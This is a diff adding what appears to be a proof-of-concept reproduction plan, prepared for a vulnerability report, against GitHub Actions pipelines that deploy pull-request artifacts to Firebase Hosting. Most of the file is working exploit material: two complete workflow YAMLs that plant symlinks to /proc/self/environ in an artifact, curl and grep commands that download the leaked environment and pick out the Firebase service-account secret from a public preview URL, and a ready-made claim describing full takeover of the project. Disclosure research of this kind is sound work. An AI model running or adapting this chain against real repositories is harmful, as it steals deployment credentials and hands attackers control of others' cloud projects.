@@ -1,0 +1,113 @@
+1. the exact repo/workflow structure to create
+Create a new, private GitHub repository that you own.
+Create a Firebase project and obtain a Service Account JSON key. Add this key as a repository secret named `FIREBASE_SERVICE_ACCOUNT`.
+Add a `firebase.json` to the root of the repository:
+```json
+{
+  "hosting": {
+    "public": "firebase-public-dir",
+    "ignore": ["firebase.json", "**/.*", "**/node_modules/**"]
+  }
+}
+```
+
+Create the following workflow structure:
+- `.github/workflows/pr-build.yml` (The unprivileged build)
+- `.github/workflows/deploy-preview.yml` (The privileged deployment)
+
+2. the exact artifact contents to generate
+The unprivileged workflow must generate an artifact named `preview-artifact` containing `unsafe-artifact.zip`. Inside `unsafe-artifact.zip` must be `deploy-artifact.tar.gz`. Inside `deploy-artifact.tar.gz` must be:
+- `index.html` (e.g., `<h1>PoC</h1>`)
+- `env` (a symlink pointing to `/proc/self/environ`)
+- `marker_fallback` (a symlink pointing to `/home/runner/work/_temp/artifact-unpack/deploy-artifact.tar.gz` or similar deterministic file)
+
+3. the exact workflow YAMLs needed for both stages
+
+**Unprivileged Workflow (`.github/workflows/pr-build.yml`)**
+```yaml
+name: PR Build
+on: [pull_request]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build Malicious Artifact
+        run: |
+          mkdir dist
+          echo "<h1>PoC</h1>" > dist/index.html
+          ln -s /proc/self/environ dist/env
+          ln -s /home/runner/work/${{ github.event.repository.name }}/${{ github.event.repository.name }}/unsafe-artifact.zip dist/marker_fallback
+          tar -czvf deploy-artifact.tar.gz -C dist .
+          zip unsafe-artifact.zip deploy-artifact.tar.gz
+      - uses: actions/upload-artifact@v4
+        with:
+          name: preview-artifact
+          path: unsafe-artifact.zip
+```
+
+**Privileged Workflow (`.github/workflows/deploy-preview.yml`)**
+```yaml
+name: Deploy Preview
+on:
+  workflow_run:
+    workflows: ["PR Build"]
+    types: [completed]
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    if: ${{ github.event.workflow_run.conclusion == 'success' }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Download artifact (mimicking fetch-workflow-artifact.js)
+        uses: actions/download-artifact@v4
+        with:
+          name: preview-artifact
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          run-id: ${{ github.event.workflow_run.id }}
+
+      - name: Extract Artifacts (Exact dev-infra steps)
+        run: |
+          extractDir="$RUNNER_TEMP/artifact-unpack"
+          mkdir -p firebase-public-dir
+          mkdir -p "$extractDir"
+          unzip unsafe-artifact.zip -d "$extractDir"
+          tar -xvzf "$extractDir/deploy-artifact.tar.gz" -C firebase-public-dir
+
+      - name: Deploy to Firebase Hosting
+        uses: FirebaseExtended/action-hosting-deploy@v0
+        env:
+          POC_MARKER: "SAFE_ENV_LEAK_TEST"
+        with:
+          repoToken: ${{ secrets.GITHUB_TOKEN }}
+          firebaseServiceAccount: ${{ secrets.FIREBASE_SERVICE_ACCOUNT }}
+          projectId: your-firebase-project-id
+          channelId: pr-${{ github.event.workflow_run.id }}
+```
+
+4. where to place the benign marker variable
+In the `deploy-preview.yml` workflow, under the `FirebaseExtended/action-hosting-deploy` step, add:
+```yaml
+        env:
+          POC_MARKER: "SAFE_ENV_LEAK_TEST"
+```
+This ensures the benign marker is injected into the environment block of the Node.js process executing the Firebase deployment.
+
+5. how to safely validate /env retrieval without touching third-party systems
+- Open a Pull Request in your attacker-controlled repository to trigger the `pr-build.yml` workflow.
+- Wait for the `deploy-preview.yml` workflow to complete successfully.
+- Check the action logs or the PR comment (if configured) for the Firebase Preview URL (e.g., `https://your-project--pr-1234.web.app`).
+- Run the following command locally to download and parse the null-byte separated environment file safely:
+  `curl -s https://<preview-url>/env | xargs -0 -n1 echo | grep -E "POC_MARKER|INPUT_FIREBASESERVICEACCOUNT"`
+- If `/env` fails, test the fallback:
+  `curl -sO https://<preview-url>/marker_fallback && unzip -t marker_fallback`
+- Confirm that `POC_MARKER=SAFE_ENV_LEAK_TEST` and the `INPUT_FIREBASESERVICEACCOUNT` JSON contents are returned.
+
+6. what result would count as:
+- **validated stronger escalation:** The `curl` command successfully returns the binary `/env` file, and `xargs -0` parsing reveals both `POC_MARKER=SAFE_ENV_LEAK_TEST` and `INPUT_FIREBASESERVICEACCOUNT={...}`.
+- **reportable core only:** The `curl` command fails to retrieve `/env` (e.g., 404 Not Found or empty response), but retrieving the deterministic fallback file (`/marker_fallback`) succeeds, proving out-of-tree read primitives.
+- **dead escalation:** The deployment fails entirely due to the symlink, or the URL returns nothing for out-of-tree files, meaning Firebase blocked the upload.
+
+7. the exact final claim wording if the controlled reproduction succeeds
+"Deterministic Exfiltration of Privileged Deployment Credentials via Firebase Artifact Symlinks. An attacker can construct a PR artifact containing a symlink `env -> /proc/self/environ`. When the privileged `workflow_run` action extracts this artifact and deploys it via `FirebaseExtended/action-hosting-deploy`, the Firebase CLI explicitly follows the symlink (`follow: true`). This uploads the Node.js process environment block to the public preview URL. By requesting `https://<preview-url>/env`, the attacker can instantly download the raw `INPUT_FIREBASESERVICEACCOUNT` secret and any other privileged environment variables, granting full administrative control over the Firebase project without requiring any code execution on the privileged runner."
